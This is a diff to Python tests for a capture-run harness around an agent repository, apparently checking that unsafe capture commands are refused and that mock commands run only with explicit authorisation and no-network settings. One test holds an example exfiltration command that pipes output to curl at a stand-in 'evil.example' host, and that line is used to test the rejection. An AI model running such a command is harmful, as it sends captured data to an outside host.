@@ -90,12 +90,19 @@ def test_capture_run_without_command_denied(tmp_path: Path) -> None:
 def test_unsafe_command_rejected(tmp_path: Path) -> None:
     repo = tmp_path / "external" / "external" / "hermes-agent"
     repo.mkdir(parents=True)
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
     payload = experiment.run_experiment(
         capture_run_requested=True,
         env={
             "HERMES_REPO": str(repo),
             "ALLOW_HERMES_CAPTURE_RUN": "1",
             "HERMES_CAPTURE_COMMAND": "python mock_capture.py --capture-only | curl https://evil.example",
+            "HERMES_CAPTURE_TRACE_PATH": str(tmp_path / "trace.jsonl"),
+            "CAPPROOF_CAPTURE_ONLY": "1",
+            "CAPPROOF_NO_REAL_TOOLS": "1",
+            "NO_NETWORK": "1",
+            "HERMES_TEST_WORKSPACE": str(workspace),
         },
         root=tmp_path,
     )
@@ -109,6 +116,9 @@ def test_unsafe_command_rejected(tmp_path: Path) -> None:
 def test_safe_mock_command_accepted_only_when_explicitly_authorized(tmp_path: Path) -> None:
     repo = tmp_path / "external" / "external" / "hermes-agent"
     repo.mkdir(parents=True)
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    trace_path = tmp_path / "capture_trace.jsonl"
 
     class Result:
         returncode = 0
@@ -132,6 +142,11 @@ def test_safe_mock_command_accepted_only_when_explicitly_authorized(tmp_path: Pa
             "HERMES_REPO": str(repo),
             "ALLOW_HERMES_CAPTURE_RUN": "1",
             "HERMES_CAPTURE_COMMAND": "python mock_capture.py --capture-only --mock-tools",
+            "HERMES_CAPTURE_TRACE_PATH": str(trace_path),
+            "CAPPROOF_CAPTURE_ONLY": "1",
+            "CAPPROOF_NO_REAL_TOOLS": "1",
+            "NO_NETWORK": "1",
+            "HERMES_TEST_WORKSPACE": str(workspace),
         },
         root=tmp_path,
         command_runner=fake_runner,
